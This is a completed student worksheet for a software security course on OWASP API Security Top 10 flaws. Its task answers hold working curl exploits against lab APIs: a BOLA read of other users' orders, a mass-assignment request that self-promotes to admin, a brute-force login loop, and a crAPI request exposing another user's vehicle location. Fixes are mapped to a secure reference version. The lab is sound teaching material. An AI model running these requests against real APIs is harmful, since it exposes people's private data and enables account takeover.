# Worksheet 10 — API Security (3 hrs)

> **Course:** Software Security (KOSEN69) · Week 10
> **Aligned:** OWASP API Security Top 10:2023 — API1 BOLA · API3 Broken Object Property Level Auth (Mass Assignment) · API4 Unrestricted Resource Consumption
> **Signature game:** 🥷 crAPI Raid
>
> **Ethics note:** Run exploits **only** against the lab targets shipped here (`vulnerable_api.py` on `:8080`) or your own OWASP crAPI instance. Never test BOLA, mass assignment, or brute-force against systems you do not own or are not explicitly authorized to test.

## Part 1 — Student Information 🟢

| Name | Student ID | Date | Group |
| Panaikron Marohabut | 6631503126 | 2026-10-10 | 

## Part 2 — Lecture Questions

1. Define **BOLA (API1:2023)**. Why is it the #1 API risk, and why can't a WAF reliably stop it?

   ANSWER: BOLA (Broken Object Level Authorization) means the API checks "WHO" is
   calling but never checks if that user owns the object they are asking for.
   It is like "IDOR" but at API scale — just change the id in the URL to read
   another user's data. It is the #1 risk because APIs put object ids in URLs
   everywhere, so attackers can try one id after another. A WAF cannot stop it
   because the request is normal, valid JSON — nothing looks like an attack.
   Only the app itself knows who should own each object.

2. What is **mass assignment / broken object property level authorization (API3:2023)**? Contrast a blocklist vs. an allow-list of bindable fields.

   ANSWER: **Mass assignment** happens when the server copies the whole JSON body
   into the database record without filtering (like `user.update(body)`), so a
   client can add fields it should never control, such as is_admin or balance.
   "A blocklist" tries to ban the dangerous fields but allows everything else —
   it breaks easily if a new sensitive field is added later. 
   "An allow-list" does the opposite: it names only the safe fields (e.g. username and password) and drops the rest, which is safer by default.

3. **API4:2023** is unrestricted resource consumption. Give two distinct impacts (security and availability) of an unthrottled `/api/login`.

   ANSWER:
   - Security impact: without a rate limit an attacker can try unlimited
     password guesses (brute force / credential stuffing) until one works and
     the account is taken over.
   - Availability impact: thousands of login requests overload the server CPU
     and database, so the service slows down or crashes for real users (DoS).

4. In `vulnerable_api.py`, `current_user()` trusts the `X-User-Id` header. Why is a client-supplied header NOT authentication, and what should replace it?

   ANSWER: Any client can set or change a header with curl or Postman, so
   X-User-Id is just the client SAYING who it is — there is no proof behind it.
   Real authentication needs something the client cannot forge: a signed JWT
   checked on the server, or a random session token stored server-side.

5. Why does object-level authorization have to be checked **per request, per object** rather than once at login?

   ANSWER: Logging in only proves who you are (authentication), it says nothing
   about which objects you may touch. Each request asks for a different object,
   so the server must check "does this caller own THIS object?" every time.
   Permissions can also change while a session is still open, so a one-time
   check at login is not enough.

## Part 3 — Hands-on Lab (145 min)

**Learning goals:** Exploit BOLA, mass assignment, and a missing rate limit against a live API; then read the secure version and explain each fix.

**Prerequisites:** Docker + Docker Compose, `curl`. (Optional bonus: cloned OWASP crAPI.)

**Environment setup**
```bash
cd labs/week10-api-security
docker compose up         # INSECURE API on :8080, SECURE API on :8081
# Seeded users: alice(id 1) bob(id 2) carol(id 3, admin, balance 9999)
```

**What to submit per task:** the exact command(s) + raw response/HTTP status, a screenshot, and a 2–3 sentence mitigation note mapping the bug to its OWASP API id.

### Task 0 — Onboarding (15 min)
Confirm both APIs respond: `curl http://localhost:8080/` and `curl http://localhost:8081/`. Note which port is insecure. Record the three seeded users.
**Deliverable:** both root responses + the user table.

![One REST API with three flaws — reading another user's orders by id, smuggling an admin field into user creation, and an unthrottled login — each shown at the handler where it occurs, next to its one-line fix.](img/api-flaws.svg)

### Task 0 — Answer (6631503126)

**Commands + responses:**

```bash
$ curl http://localhost:8080/
Week 10 INSECURE API — see attack.md

$ curl http://localhost:8081/
Week 10 SECURE API
```

**Which port is insecure:** `:8080` (runs `vulnerable_api.py`) — this is the attack target. `:8081` runs `solution_api.py`, the fixed version, for comparison.

**Seeded users (from `vulnerable_api.py` L21-28):**

| id | username | password | is_admin | balance |
|----|----------|----------|----------|---------|
| 1  | alice    | alice123 | false    | 100     |
| 2  | bob      | bob123   | false    | 50      |
| 3  | carol    | carol123 | true     | 9999    |

**Screenshot:**

![Task 0 — Onboarding](img/T0.png)

### Task 1 — BOLA: read another user's orders (35 min)
**Goal:** Read carol's (admin) orders without being carol — API1:2023.
**Steps:**
1. `curl http://localhost:8080/api/users/3/orders` — note you receive the "Server rack" order with no auth.
2. Iterate the id: `curl http://localhost:8080/api/users/2/orders`.
3. On the secure API observe the ladder: `curl -i http://localhost:8081/api/users/3/orders` (401), `curl -i -H "X-User-Id: 1" http://localhost:8081/api/users/3/orders` (403), `curl -i -H "X-User-Id: 1" http://localhost:8081/api/users/1/orders` (200).
**Deliverable:** the leaked order JSON + the 401/403/200 transcript + mitigation note.

### Task 1 — Answer (6631503126)

**1) BOLA on insecure API (:8080) — carol's orders leaked with no auth:**

```bash
$ curl http://localhost:8080/api/users/3/orders
[{"item":"Server rack","order_id":"C-1","total":5000},{"item":"FLAG{bola_demo}","order_id":"C-FLAG","total":0}]

$ curl http://localhost:8080/api/users/2/orders
[{"item":"Mouse","order_id":"B-1","total":15}]
```

Carol's orders (incl. `FLAG{bola_demo}`) and bob's orders are returned with **no identity at all** — `get_orders()` (`vulnerable_api.py` L50-51) never reads who is calling; there is no check to bypass.

**2) Secure API (:8081) — the 401/403/200 ladder:**

```bash
$ curl -i http://localhost:8081/api/users/3/orders
HTTP/1.1 401 UNAUTHORIZED
{"error":"authentication required"}

$ curl -i -H "X-User-Id: 1" http://localhost:8081/api/users/3/orders
HTTP/1.1 403 FORBIDDEN
{"error":"forbidden"}

$ curl -i -H "X-User-Id: 1" http://localhost:8081/api/users/1/orders
HTTP/1.1 200 OK
[{"item":"Keyboard","order_id":"A-1","total":30}]
```

**Mitigation note (API1:2023 BOLA):** The endpoint returned any user's orders by id with no ownership check. The fix is a per-request object-level authorization check — `caller["id"] != uid and not caller["is_admin"]` → 403 — so the server asks "does the caller own this object?" on every request.

**Screenshot:**

![Task 1 — BOLA leaked orders + 401/403/200 ladder](img/T1.png)

### Task 2 — Mass assignment: self-promote to admin (30 min)
**Goal:** Smuggle `is_admin` + `balance` into user creation — API3:2023.
**Steps:**
1. `curl -X POST http://localhost:8080/api/users -H "Content-Type: application/json" -d '{"username":"mallory","password":"x","is_admin":true,"balance":1000000}'`
2. Confirm the response echoes `"is_admin": true, "balance": 1000000`.
3. Repeat against `:8081` and confirm the smuggled fields are forced to `is_admin:false, balance:0`.
**Deliverable:** both responses side by side + mitigation note (allow-list in `solution_api.py`).

### Task 2 — Answer (6631503126)

**1) Mass assignment on insecure API (:8080) — smuggled fields accepted:**

```bash
$ curl -X POST http://localhost:8080/api/users -H "Content-Type: application/json" -d '{"username":"mallory","password":"x","is_admin":true,"balance":1000000}'
{"balance":1000000,"flag":"FLAG{massassign_demo}","id":4,"is_admin":true,"password":"x","username":"mallory"}
```

`user.update(body)` (`vulnerable_api.py` L62) binds the whole JSON body, so `is_admin` and `balance` are stored — and `is_admin:true` reveals `FLAG{massassign_demo}`.

**2) Same request on secure API (:8081) — smuggled fields ignored:**

```bash
$ curl -X POST http://localhost:8081/api/users -H "Content-Type: application/json" -d '{"username":"mallory","password":"x","is_admin":true,"balance":1000000}'
{"balance":0,"id":4,"is_admin":false,"password":"x","username":"mallory"}
```

**Mitigation note (API3:2023 BOPLA / mass assignment):** The insecure endpoint trusts every key in the request body. The fix is an allow-list of bindable fields — `ALLOWED_CREATE_FIELDS = {"username","password"}` (`solution_api.py` L34, L62) — while the server sets sensitive fields itself (`balance:0`, `is_admin:false`, L66). Fields the client should never control are simply discarded.

**Screenshot:**

![Task 2 — Mass assignment self-promote to admin](img/T2.png)

### Task 3 — Unrestricted resource consumption: brute-force login (25 min)
**Goal:** Show `/api/login` has no throttle — API4:2023.
**Steps:**
1. Run the brute-force loop from `attack.md` against `:8080` (guesses incl. `alice123`) — all attempts processed.
2. On `:8081` loop 7 times: `for i in $(seq 1 7); do curl -s -o /dev/null -w "%{http_code}\n" -X POST http://localhost:8081/api/login -H "Content-Type: application/json" -d '{"username":"alice","password":"wrong"}'; done`
3. Confirm the 6th/7th attempt returns `429`.
**Deliverable:** the `401 401 401 401 401 429 429` sequence + mitigation note.

### Task 3 — Answer (6631503126)

**1) Brute-force on insecure API (:8080) — every guess is processed, no throttle:**

```bash
$ for pw in wrong1 wrong2 wrong3 alice123; do
  curl -s -X POST http://localhost:8080/api/login -H "Content-Type: application/json" -d "{\"username\":\"alice\",\"password\":\"$pw\"}"; echo
done
{"ok":false}
{"ok":false}
{"ok":false}
{"is_admin":false,"ok":true,"user_id":1}
```

All 4 guesses are processed — and the last one (`alice123`, alice's real password) logs in as `user_id:1`. With no rate limit an attacker can keep guessing until the password is found.

**2) Same endpoint on secure API (:8081) — locked out after 5 attempts:**

```bash
$ for i in $(seq 1 7); do curl -s -o /dev/null -w "%{http_code}\n" -X POST http://localhost:8081/api/login -H "Content-Type: application/json" -d '{"username":"alice","password":"wrong"}'; done
401
401
401
401
401
429
429
```

The first 5 wrong guesses return `401`; attempts 6 and 7 within 60s return `429 Too Many Requests`.

**Mitigation note (API4:2023 Unrestricted Resource Consumption):** The insecure `/api/login` answers unlimited requests, enabling brute-force account takeover and request-flooding DoS. The fix is a per-IP limiter — `RATE_LIMIT=5` per `RATE_WINDOW=60` seconds (`solution_api.py` L73-74), checked before the password (L89-90) so excess attempts get `429` instead of CPU/database work.

**Screenshot:**

![Task 3 — Brute-force login + 429 lockout](img/T3.png)

### Task 4 — Bonus: crAPI Raid (optional, 20 min)
Against your own OWASP crAPI instance (`git clone https://github.com/OWASP/crAPI.git`), capture one BOLA or mass-assignment flag.
**Deliverable:** flag + endpoint + which API Top 10 id it maps to.

### Task 4 — Answer (6631503126)

**Steps (against own crAPI instance, gateway :8888):**

1. Signed up + logged in as `pan@mail.com` via `POST /identity/api/auth/login` → got JWT (`"role":"user"`):

```json
{"token":"eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJwYW5AbWFpbC5jb20i...","type":"Bearer","message":"Login successful"}
```

2. `GET /community/api/v2/community/posts/recent` — every post leaks the author's `vehicleid` GUID in the response (excessive data exposure). Picked Adam's GUID:

```json
"author": {"nickname":"Adam","email":"adam007@example.com","vehicleid":"f89b5f21-7829-45cb-a650-299a61090378"}
```

3. Called the vehicle location endpoint with **pan's** JWT but **Adam's** vehicle GUID:

```bash
$ curl -i "http://localhost:8888/identity/api/v2/vehicle/f89b5f21-7829-45cb-a650-299a61090378/location" -H "Authorization: Bearer $TOKEN"
HTTP/1.1 200
{"carId":"f89b5f21-7829-45cb-a650-299a61090378","vehicleLocation":{"id":1,"latitude":"32.778889","longitude":"-91.919243"},"fullName":"Adam","email":"adam007@example.com"}
```

**Result (flag):** Read another user's (Adam's) vehicle GPS location — plus his full name and email — while authenticated only as `pan`. The handler `getLocationBOLA()` (`VehicleController.java` L121) returns the location for any GUID without checking that the caller owns the vehicle.

**Maps to:** **API1:2023 BOLA** — the location endpoint performs no object-level authorization on `carId`. Enabled by **API3:2023 excessive data exposure** — the posts endpoint leaking every author's `vehicleid` GUID, which is how the victim's unguessable id was obtained.

**Screenshot:**

![Task 4 — crAPI BOLA vehicle location](img/T4.png)

### Task 5 — Defend / fix it (20 min)
**Goal:** Explain the fixes using the secure reference `solution_api.py`.
**Steps:** Read the three `# --- FIX ...` blocks. For each, quote the line(s) that defeat your Task 1–3 exploit: the per-object ownership check (`caller["id"] != uid and not caller["is_admin"]`), `ALLOWED_CREATE_FIELDS` binding, and the `RATE_LIMIT=5 / RATE_WINDOW=60` limiter.
**Deliverable:** for each of API1/API3/API4 — the exploit that worked on `:8080`, the line in `solution_api.py` that blocks it, and the new HTTP status on `:8081`.

### Task 5 — Answer (6631503126)

| Finding | Exploit that worked on :8080 | Fix line(s) in `solution_api.py` | New status on :8081 |
|---------|------------------------------|----------------------------------|---------------------|
| **API1:2023 BOLA** | `GET /api/users/3/orders` returned carol's orders (incl. `FLAG{bola_demo}`) with no identity at all | L47-49 — `caller = current_user()` → `401` when no identity; L51 — `if caller["id"] != uid and not caller["is_admin"]: return 403` (per-object ownership check) | `401` (no id) → `403` (not owner) → `200` (own object) |
| **API3:2023 Mass assignment** | `POST /api/users` with `"is_admin":true,"balance":1000000` was stored and returned `FLAG{massassign_demo}` | L34 — `ALLOWED_CREATE_FIELDS = {"username", "password"}`; L62 — `user = {k: body[k] for k in ALLOWED_CREATE_FIELDS if k in body}` (binds only safe keys); L66 — `user.update({"id": _next_id, "balance": 0, "is_admin": False})` (server controls sensitive fields) | `201` but `is_admin:false, balance:0` — smuggled fields discarded |
| **API4:2023 Unrestricted Resource Consumption** | Unlimited login guesses on `/api/login`; every attempt processed, `alice123` logged in as alice | L73-74 — `RATE_LIMIT = 5` / `RATE_WINDOW = 60`; L78-84 — `rate_limited(ip)` sliding window; L89-90 — `if rate_limited(...): return 429` **before** the password check | `401`×5 then `429`×2 |

The three fixes are authorization/design controls, not input filters — the JSON in every exploit was well formed; the server simply allowed what it should not have.

## Part 4 — Reflection

1. **Mapping:** complete a table — finding | endpoint | OWASP API id | fix applied.
2. **Real breach:** research an API authorization breach (e.g., the Optus or T-Mobile BOLA/IDOR incidents). Which API Top 10 id matches, and would the `solution_api.py` ownership check have prevented it?
3. **Best mitigation:** of object-level auth, allow-list binding, and rate limiting — which gives the most risk reduction for an API platform, and why?

## Grading rubric (100)

| Criterion | Weight |
|-----------|--------|
| Lecture questions (Part 2) | 20 |
| Exploitation + evidence (Tasks 1–4: commands, output, screenshots) | 40 |
| Defense (Task 5: fixes mapped to `solution_api.py`) | 25 |
| Reflection (Part 4: mapping, breach, best mitigation) | 15 |
| **Total** | **100** |

---

## Evidence & Integrity (required)

- **Identity proof:** every screenshot/diagram must show a terminal running `printf '%s | %s | ' "$(whoami)" '<YOUR-STUDENT-ID>'; date '+%F %T %Z'` **in the
  same image as the evidence**. When the evidence is a browser page, a DevTools panel or a
  rendered response, put that terminal **beside the browser and capture the whole screen** — a
  cropped window carries nothing that identifies you, and the lab's own output is
  byte-identical for the whole cohort *by design*, so the stamp is the only thing that makes
  the shot yours. Generic or borrowed evidence is not accepted.
- **Personalized flag (if this lab issues one):** ____________________
  *Flags are unique per student — submitting another student's flag is a violation. How to submit: **learn.zcr.ai/submit** (full guide: `SUBMISSION.md` in the repo root).*
- **Explain in your own words** *(graded on your reasoning, not copied text):*
  1. What did you do, and **why did the vulnerability work**?
  2. **Why does your fix actually stop it** — and what could still break it?

---

## 🤖 Audit the AI (required)

AI is a power tool you must **distrust** — you are graded on your *critique*, not the AI's answer.

1. Ask an AI assistant to exploit **or** fix this week's vulnerability. Paste its full answer.
2. **Find what's wrong or risky** in it — insecure code, a subtly incomplete fix, a hallucinated API/function/CVE, a missed edge case, or wrong reasoning. Quote the exact line(s).
3. Produce the **correct, verified** version yourself and explain in 2–3 sentences why the AI's output was insufficient.

> Disclose your AI use in the Part 1 table. This task counts toward your **Defense + Reflection** score.

---

## 🧠 Comprehension & Prompt (required)

**A. Explain in Plain English (EiPE).** In 2–3 sentences, in your own words, describe what this week's vulnerable code/endpoint actually *does* and *why it is exploitable* — explain the mechanism, don't dump jargon.

**B. Prompt Problem.** Write a **single prompt** that makes an AI produce a *correct, secure* fix for one finding. Run it: does the exploit now fail? If not, refine the prompt and try again. Submit the **final prompt + the verified result**.
*Graded on the prompt's precision and your verification — this trains problem decomposition and AI literacy (Denny et al. 2024).*
